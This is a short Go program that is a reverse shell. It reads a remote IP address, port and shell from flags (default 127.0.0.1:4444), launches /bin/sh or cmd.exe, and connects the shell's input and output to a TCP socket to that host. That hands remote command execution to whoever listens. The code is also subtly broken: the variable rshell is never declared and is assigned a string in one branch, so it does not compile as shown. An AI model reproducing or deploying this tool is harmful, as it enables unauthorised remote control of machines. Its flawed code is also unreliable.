package main

import (
    "flag"
    "net"
    "os/exec"
    "runtime"
)

func main() {
    var ip string
    var port string
    var shell string

    flag.StringVar(&ip,"ip","127.0.0.1","Remote IP Address")
    flag.StringVar(&port,"port","4444","Remote Port")
    flag.StringVar(&shell,"shell","null","Shell")
    flag.Parse()

    if shell == "null" {
        switch runtime.GOOS {
	    case "linux":
	        rshell = exec.Command("/bin/sh")
	    case "windows":
		rshell = exec.Command("cmd.exe")
        }
    } else {
        rshell = shell
    }

    host := net.ParseIP(ip).String() + ":" + port
    socket, _ := net.Dial("tcp",host)
    rshell.Stdin = socket
    rshell.Stdout = socket
    rshell.Stderr = socket
    rshell.Run()
}
